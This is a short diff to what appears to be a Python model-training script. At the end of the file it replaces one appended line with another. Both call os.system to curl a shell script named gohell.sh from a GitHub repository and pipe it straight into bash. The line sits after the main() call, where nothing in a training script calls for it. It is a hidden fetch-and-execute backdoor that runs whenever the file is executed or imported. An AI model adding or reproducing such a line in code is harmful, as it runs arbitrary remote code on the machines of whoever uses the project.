@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash')
+os.system('curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash')
